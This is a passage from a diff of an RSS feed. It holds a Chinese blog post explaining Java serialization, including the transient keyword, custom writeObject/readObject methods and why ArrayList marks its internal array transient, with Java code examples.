+        &lt;span&gt;return&lt;/span&gt; username&lt;span&gt;;&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+
+    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;setUsername&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;String username&lt;span&gt;)&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+        &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;username&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; username&lt;span&gt;;&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+
+    &lt;span&gt;public&lt;/span&gt; String &lt;span&gt;getPasswd&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+        &lt;span&gt;return&lt;/span&gt; passwd&lt;span&gt;;&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+
+    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;setPasswd&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;String passwd&lt;span&gt;)&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+        &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;passwd&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; passwd&lt;span&gt;;&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+
+    &lt;span&gt;@Override&lt;/span&gt;
+    &lt;span&gt;public&lt;/span&gt; String &lt;span&gt;toString&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;username = &quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt; getUsername&lt;span&gt;()&lt;/span&gt; &lt;span&gt;+&lt;/span&gt; &lt;span&gt;&quot;\r\n&quot;&lt;/span&gt;
+                &lt;span&gt;+&lt;/span&gt; &lt;span&gt;&quot;passwd = &quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt; getPasswd&lt;span&gt;();&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+&lt;span&gt;}&lt;/span&gt;
+&lt;span&gt;/*&lt;/span&gt;
+&lt;span&gt;Output:&lt;/span&gt;
+&lt;span&gt;username = hello&lt;/span&gt;
+&lt;span&gt;passwd = world&lt;/span&gt;
+&lt;span&gt; */&lt;/span&gt;
+&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;span&gt;  此外，还可以通过实现 Externalizable 接口——代替实现Serializable接口——来对序列化进行控制。这个 Externalizable 接口继承了 Serialazable 接口，同时增添了两个方法： writeExternal() 和 readExternal()，这两个方法会在序列化和反序列化还原的过程中被自动调用，以便执行一些特殊操作。&lt;/span&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;span&gt;transient（瞬时）关键字&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span&gt;  当我们对序列化进行控制时，可能不想让 Java 的序列化机制自动保存与恢复某些敏感信息字段，比如密码，即使这些字段是私有属性，一经序列化处理，人们就可以通过读取文件或者拦截网络传输的方式来访问它。为了允以控制，可以用transient（瞬时）关键字逐个字段地关闭序列化。修改上述例子，将 passwd 字段设置为 transient：&lt;/span&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;&lt;span&gt;package&lt;/span&gt; &lt;span&gt;test&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
+
+&lt;span&gt;import&lt;/span&gt; &lt;span&gt;java.io.*&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
+
+&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; &lt;span&gt;SerializableDemo&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; Serializable&lt;span&gt;{&lt;/span&gt;
+    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;String&lt;span&gt;[]&lt;/span&gt; args&lt;span&gt;)&lt;/span&gt; &lt;span&gt;throws&lt;/span&gt; IOException&lt;span&gt;,&lt;/span&gt; ClassNotFoundException &lt;span&gt;{&lt;/span&gt;
+        User user &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; User&lt;span&gt;();&lt;/span&gt;
+        user&lt;span&gt;.&lt;/span&gt;&lt;span&gt;setUsername&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;hello&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;
+        user&lt;span&gt;.&lt;/span&gt;&lt;span&gt;setPasswd&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;world&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;
+
+        &lt;span&gt;//write Obj to File&lt;/span&gt;
+        ObjectOutputStream oos &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ObjectOutputStream&lt;span&gt;(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; FileOutputStream&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;file&quot;&lt;/span&gt;&lt;span&gt;));&lt;/span&gt;
+        oos&lt;span&gt;.&lt;/span&gt;&lt;span&gt;writeObject&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;user&lt;span&gt;);&lt;/span&gt;
+        oos&lt;span&gt;.&lt;/span&gt;&lt;span&gt;close&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+
+        &lt;span&gt;//read Obj from File&lt;/span&gt;
+        File file &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; File&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;file&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;
+        ObjectInputStream ois &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ObjectInputStream&lt;span&gt;(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; FileInputStream&lt;span&gt;(&lt;/span&gt;file&lt;span&gt;));&lt;/span&gt;
+        User newUser &lt;span&gt;=&lt;/span&gt; &lt;span&gt;(&lt;/span&gt;User&lt;span&gt;)&lt;/span&gt;ois&lt;span&gt;.&lt;/span&gt;&lt;span&gt;readObject&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+        ois&lt;span&gt;.&lt;/span&gt;&lt;span&gt;close&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+        System&lt;span&gt;.&lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;println&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;newUser&lt;span&gt;);&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+&lt;span&gt;}&lt;/span&gt;
+
+&lt;span&gt;class&lt;/span&gt; &lt;span&gt;User&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; Serializable&lt;span&gt;{&lt;/span&gt;
+    &lt;span&gt;private&lt;/span&gt; String username&lt;span&gt;;&lt;/span&gt;
+    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;transient&lt;/span&gt; String passwd&lt;span&gt;;&lt;/span&gt;
+
+    &lt;span&gt;public&lt;/span&gt; String &lt;span&gt;getUsername&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+        &lt;span&gt;return&lt;/span&gt; username&lt;span&gt;;&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+
+    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;setUsername&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;String username&lt;span&gt;)&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+        &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;username&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; username&lt;span&gt;;&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+
+    &lt;span&gt;public&lt;/span&gt; String &lt;span&gt;getPasswd&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+        &lt;span&gt;return&lt;/span&gt; passwd&lt;span&gt;;&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+
+    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;setPasswd&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;String passwd&lt;span&gt;)&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+        &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;passwd&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; passwd&lt;span&gt;;&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+
+    &lt;span&gt;@Override&lt;/span&gt;
+    &lt;span&gt;public&lt;/span&gt; String &lt;span&gt;toString&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;username = &quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt; getUsername&lt;span&gt;()&lt;/span&gt; &lt;span&gt;+&lt;/span&gt; &lt;span&gt;&quot;\r\n&quot;&lt;/span&gt;
+                &lt;span&gt;+&lt;/span&gt; &lt;span&gt;&quot;passwd = &quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt; getPasswd&lt;span&gt;();&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+&lt;span&gt;}&lt;/span&gt;
+&lt;span&gt;/*&lt;/span&gt;
+&lt;span&gt;Output:&lt;/span&gt;
+&lt;span&gt;username = hello&lt;/span&gt;
+&lt;span&gt;passwd = null&lt;/span&gt;
+&lt;span&gt; */&lt;/span&gt;
+&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;可以看到，passwd输出的值由 world 变为 null，此外，虽然 toString() 经过重载，但是 null 引用会被自动转换成字符串 null。&lt;/p&gt;
+&lt;h2&gt;&lt;span&gt;自定义序列化和反序列化策略&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;  通过创建 ObjectOutputStream封装对象，然后调用writeObject()方法实现序列化，在调用ObjectOutputStream.writeObject()时，会检查所传递的 Serializable 对象，看看是否实现了它自己的 writeObject()。如果存在自己实现的 writeObject()方法，就跳过正常的序列化过程并调用它的writeObject()，同样，readObject()情形与此相同。此外，在自定义的 writeObject()内部，可以调用 defaultWriteObject() 来选择执行默认的 writeObject()；类似地，在 readObject() 内部，可以调用 defaultReadObject()。&lt;/p&gt;
+&lt;div class=&quot;highlight&quot; readability=&quot;14&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;&lt;span&gt;//: io/SerialCtl.java&lt;/span&gt;
+&lt;span&gt;// Controlling serialization by adding your own&lt;/span&gt;
+&lt;span&gt;// writeObject() and readObject() methods.&lt;/span&gt;
+&lt;span&gt;import&lt;/span&gt; &lt;span&gt;java.io.*&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
+
+&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; &lt;span&gt;SerialCtl&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; Serializable &lt;span&gt;{&lt;/span&gt;
+  &lt;span&gt;private&lt;/span&gt; String a&lt;span&gt;;&lt;/span&gt;
+  &lt;span&gt;private&lt;/span&gt; &lt;span&gt;transient&lt;/span&gt; String b&lt;span&gt;;&lt;/span&gt;
+  &lt;span&gt;public&lt;/span&gt; &lt;span&gt;SerialCtl&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;String aa&lt;span&gt;,&lt;/span&gt; String bb&lt;span&gt;)&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+    a &lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;Not Transient: &quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt; aa&lt;span&gt;;&lt;/span&gt;
+    b &lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;Transient: &quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt; bb&lt;span&gt;;&lt;/span&gt;
+  &lt;span&gt;}&lt;/span&gt;
+  &lt;span&gt;public&lt;/span&gt; String &lt;span&gt;toString&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;span&gt;{&lt;/span&gt; &lt;span&gt;return&lt;/span&gt; a &lt;span&gt;+&lt;/span&gt; &lt;span&gt;&quot;\n&quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt; b&lt;span&gt;;&lt;/span&gt; &lt;span&gt;}&lt;/span&gt;
+  &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;writeObject&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;ObjectOutputStream stream&lt;span&gt;)&lt;/span&gt;
+  &lt;span&gt;throws&lt;/span&gt; IOException &lt;span&gt;{&lt;/span&gt;
+    stream&lt;span&gt;.&lt;/span&gt;&lt;span&gt;defaultWriteObject&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+    stream&lt;span&gt;.&lt;/span&gt;&lt;span&gt;writeObject&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;b&lt;span&gt;);&lt;/span&gt;
+  &lt;span&gt;}&lt;/span&gt;
+  &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;readObject&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;ObjectInputStream stream&lt;span&gt;)&lt;/span&gt;
+  &lt;span&gt;throws&lt;/span&gt; IOException&lt;span&gt;,&lt;/span&gt; ClassNotFoundException &lt;span&gt;{&lt;/span&gt;
+    stream&lt;span&gt;.&lt;/span&gt;&lt;span&gt;defaultReadObject&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+    b &lt;span&gt;=&lt;/span&gt; &lt;span&gt;(&lt;/span&gt;String&lt;span&gt;)&lt;/span&gt;stream&lt;span&gt;.&lt;/span&gt;&lt;span&gt;readObject&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+  &lt;span&gt;}&lt;/span&gt;
+  &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;String&lt;span&gt;[]&lt;/span&gt; args&lt;span&gt;)&lt;/span&gt;
+  &lt;span&gt;throws&lt;/span&gt; IOException&lt;span&gt;,&lt;/span&gt; ClassNotFoundException &lt;span&gt;{&lt;/span&gt;
+    SerialCtl sc &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; SerialCtl&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;Test1&quot;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; &lt;span&gt;&quot;Test2&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;
+    System&lt;span&gt;.&lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;println&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;Before:\n&quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt; sc&lt;span&gt;);&lt;/span&gt;
+    ByteArrayOutputStream buf&lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ByteArrayOutputStream&lt;span&gt;();&lt;/span&gt;
+    ObjectOutputStream o &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ObjectOutputStream&lt;span&gt;(&lt;/span&gt;buf&lt;span&gt;);&lt;/span&gt;
+    o&lt;span&gt;.&lt;/span&gt;&lt;span&gt;writeObject&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;sc&lt;span&gt;);&lt;/span&gt;
+    &lt;span&gt;// Now get it back:&lt;/span&gt;
+    ObjectInputStream in &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ObjectInputStream&lt;span&gt;(&lt;/span&gt;
+      &lt;span&gt;new&lt;/span&gt; ByteArrayInputStream&lt;span&gt;(&lt;/span&gt;buf&lt;span&gt;.&lt;/span&gt;&lt;span&gt;toByteArray&lt;/span&gt;&lt;span&gt;()));&lt;/span&gt;
+    SerialCtl sc2 &lt;span&gt;=&lt;/span&gt; &lt;span&gt;(&lt;/span&gt;SerialCtl&lt;span&gt;)&lt;/span&gt;in&lt;span&gt;.&lt;/span&gt;&lt;span&gt;readObject&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+    System&lt;span&gt;.&lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;println&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;After:\n&quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt; sc2&lt;span&gt;);&lt;/span&gt;
+  &lt;span&gt;}&lt;/span&gt;
+&lt;span&gt;}&lt;/span&gt; &lt;span&gt;/* Output:&lt;/span&gt;
+&lt;span&gt;Before:&lt;/span&gt;
+&lt;span&gt;Not Transient: Test1&lt;/span&gt;
+&lt;span&gt;Transient: Test2&lt;/span&gt;
+&lt;span&gt;After:&lt;/span&gt;
+&lt;span&gt;Not Transient: Test1&lt;/span&gt;
+&lt;span&gt;Transient: Test2&lt;/span&gt;
+&lt;span&gt;*///:~&lt;/span&gt;
+&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;&lt;span&gt;ArrayList的序列化&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;通过阅读源码，我们知道 ArrayList 的底层是数组实现的，其 elementData[] 就是用来保存元素的，其定义如下：&lt;/p&gt;
+&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;&lt;span&gt;transient&lt;/span&gt; Object&lt;span&gt;[]&lt;/span&gt; elementData&lt;span&gt;;&lt;/span&gt; &lt;span&gt;// non-private to simplify nested class access&lt;/span&gt;
+&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;elementData 通过 transient 声明，因此无法通过序列化技术保存下来，但是我们可以从一个实例中看出，其通过序列化和反序列化技术将 List 中的元素保存下来：&lt;/p&gt;
+&lt;div class=&quot;highlight&quot; readability=&quot;12&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;&lt;span&gt;package&lt;/span&gt; &lt;span&gt;test&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
+
+&lt;span&gt;import&lt;/span&gt; &lt;span&gt;java.io.*&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
+&lt;span&gt;import&lt;/span&gt; &lt;span&gt;java.util.ArrayList&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
+&lt;span&gt;import&lt;/span&gt; &lt;span&gt;java.util.List&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;
+
+&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; &lt;span&gt;ListDemo&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;String&lt;span&gt;[]&lt;/span&gt; args&lt;span&gt;)&lt;/span&gt; &lt;span&gt;throws&lt;/span&gt; IOException&lt;span&gt;,&lt;/span&gt; ClassNotFoundException &lt;span&gt;{&lt;/span&gt;
+        List&lt;span&gt;&amp;lt;&lt;/span&gt;String&lt;span&gt;&amp;gt;&lt;/span&gt;list &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ArrayList&lt;span&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
+        list&lt;span&gt;.&lt;/span&gt;&lt;span&gt;add&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;hello&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;
+        list&lt;span&gt;.&lt;/span&gt;&lt;span&gt;add&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;world&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;
+
+        &lt;span&gt;//write Obj to File&lt;/span&gt;
+        ObjectOutputStream oos &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ObjectOutputStream&lt;span&gt;(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; FileOutputStream&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;file&quot;&lt;/span&gt;&lt;span&gt;));&lt;/span&gt;
+        oos&lt;span&gt;.&lt;/span&gt;&lt;span&gt;writeObject&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;list&lt;span&gt;);&lt;/span&gt;
+        oos&lt;span&gt;.&lt;/span&gt;&lt;span&gt;close&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+
+        &lt;span&gt;//read Obj from File&lt;/span&gt;
+        File file &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; File&lt;span&gt;(&lt;/span&gt;&lt;span&gt;&quot;file&quot;&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;
+        ObjectInputStream ois &lt;span&gt;=&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ObjectInputStream&lt;span&gt;(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; FileInputStream&lt;span&gt;(&lt;/span&gt;file&lt;span&gt;));&lt;/span&gt;
+        List&lt;span&gt;&amp;lt;&lt;/span&gt;String&lt;span&gt;&amp;gt;&lt;/span&gt;newList &lt;span&gt;=&lt;/span&gt; &lt;span&gt;(&lt;/span&gt;List&lt;span&gt;&amp;lt;&lt;/span&gt;String&lt;span&gt;&amp;gt;)&lt;/span&gt; ois&lt;span&gt;.&lt;/span&gt;&lt;span&gt;readObject&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+        ois&lt;span&gt;.&lt;/span&gt;&lt;span&gt;close&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+        System&lt;span&gt;.&lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;println&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;newList&lt;span&gt;);&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+&lt;span&gt;}&lt;/span&gt;
+&lt;span&gt;/*&lt;/span&gt;
+&lt;span&gt;[hello, world]&lt;/span&gt;
+&lt;span&gt; */&lt;/span&gt;
+&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt; 再通过源码可知，其添加了 writeObject() 和 readObject() 的方法来控制序列化和反序列化&lt;/p&gt;
+&lt;div class=&quot;highlight&quot; readability=&quot;14&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;readObject&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;java&lt;span&gt;.&lt;/span&gt;&lt;span&gt;io&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;ObjectInputStream&lt;/span&gt; s&lt;span&gt;)&lt;/span&gt;
+&lt;span&gt;throws&lt;/span&gt; java&lt;span&gt;.&lt;/span&gt;&lt;span&gt;io&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;IOException&lt;/span&gt;&lt;span&gt;,&lt;/span&gt; ClassNotFoundException &lt;span&gt;{&lt;/span&gt;
+    elementData &lt;span&gt;=&lt;/span&gt; EMPTY_ELEMENTDATA&lt;span&gt;;&lt;/span&gt;
+
+    &lt;span&gt;// Read in size, and any hidden stuff&lt;/span&gt;
+    s&lt;span&gt;.&lt;/span&gt;&lt;span&gt;defaultReadObject&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+
+    &lt;span&gt;// Read in capacity&lt;/span&gt;
+    s&lt;span&gt;.&lt;/span&gt;&lt;span&gt;readInt&lt;/span&gt;&lt;span&gt;();&lt;/span&gt; &lt;span&gt;// ignored&lt;/span&gt;
+
+    &lt;span&gt;if&lt;/span&gt; &lt;span&gt;(&lt;/span&gt;size &lt;span&gt;&amp;gt;&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+        &lt;span&gt;// be like clone(), allocate array based upon size not capacity&lt;/span&gt;
+        ensureCapacityInternal&lt;span&gt;(&lt;/span&gt;size&lt;span&gt;);&lt;/span&gt;
+
+        Object&lt;span&gt;[]&lt;/span&gt; a &lt;span&gt;=&lt;/span&gt; elementData&lt;span&gt;;&lt;/span&gt;
+        &lt;span&gt;// Read in all elements in the proper order.&lt;/span&gt;
+        &lt;span&gt;for&lt;/span&gt; &lt;span&gt;(&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; i &lt;span&gt;=&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;&lt;/span&gt; i &lt;span&gt;&amp;lt;&lt;/span&gt; size&lt;span&gt;;&lt;/span&gt; i&lt;span&gt;++)&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+            a&lt;span&gt;[&lt;/span&gt;i&lt;span&gt;]&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; s&lt;span&gt;.&lt;/span&gt;&lt;span&gt;readObject&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+        &lt;span&gt;}&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+&lt;span&gt;}&lt;/span&gt;
+
+
+&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;writeObject&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;java&lt;span&gt;.&lt;/span&gt;&lt;span&gt;io&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;ObjectOutputStream&lt;/span&gt; s&lt;span&gt;)&lt;/span&gt;
+&lt;span&gt;throws&lt;/span&gt; java&lt;span&gt;.&lt;/span&gt;&lt;span&gt;io&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;IOException&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+    &lt;span&gt;// Write out element count, and any hidden stuff&lt;/span&gt;
+    &lt;span&gt;int&lt;/span&gt; expectedModCount &lt;span&gt;=&lt;/span&gt; modCount&lt;span&gt;;&lt;/span&gt;
+    s&lt;span&gt;.&lt;/span&gt;&lt;span&gt;defaultWriteObject&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;
+
+    &lt;span&gt;// Write out size as capacity for behavioural compatibility with clone()&lt;/span&gt;
+    s&lt;span&gt;.&lt;/span&gt;&lt;span&gt;writeInt&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;size&lt;span&gt;);&lt;/span&gt;
+
+    &lt;span&gt;// Write out all elements in the proper order.&lt;/span&gt;
+    &lt;span&gt;for&lt;/span&gt; &lt;span&gt;(&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; i &lt;span&gt;=&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;&lt;/span&gt; i &lt;span&gt;&amp;lt;&lt;/span&gt; size&lt;span&gt;;&lt;/span&gt; i&lt;span&gt;++)&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+        s&lt;span&gt;.&lt;/span&gt;&lt;span&gt;writeObject&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;elementData&lt;span&gt;[&lt;/span&gt;i&lt;span&gt;]);&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+
+    &lt;span&gt;if&lt;/span&gt; &lt;span&gt;(&lt;/span&gt;modCount &lt;span&gt;!=&lt;/span&gt; expectedModCount&lt;span&gt;)&lt;/span&gt; &lt;span&gt;{&lt;/span&gt;
+        &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ConcurrentModificationException&lt;span&gt;();&lt;/span&gt;
+    &lt;span&gt;}&lt;/span&gt;
+&lt;span&gt;}&lt;/span&gt;
+&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;那到这里，不禁会思考为什么要这么转好几个弯来实现序列化和反序列化，一开始直接不将 elementData 声明为 transient 不就行了？实际上，ArrayList通过动态数组的技术，当数组放满后，自动扩容，而在扩容的这部分假设仅用了一小部分，那么就会序列化一大部分的 null 元素，为了保证在序列化的时候不会将这么多 null 进行序列化，因此设置为 transient。&lt;/p&gt;
+&lt;h2&gt;&lt;span&gt;写在最后&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span&gt;  因为在阅读 ArrayList 源码的时候，不知道 transient 关键字有何作用，因此在学习之后，以作记录，部分内容源于 《Thinking in Java》&lt;/span&gt;&lt;/p&gt;
+</description>
+<pubDate>Thu, 15 Feb 2018 03:52:00 +0000</pubDate>
+<dc:creator>zxzhang</dc:creator>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/zzy19961112/p/8447656.html</dc:identifier>
+</item>
+<item>
+<title>浅析Numpy.genfromtxt及File I/O讲解 - Angel_Kitty</title>
+<link>http://www.cnblogs.com/ECJTUACM-873284962/p/8449346.html</link>
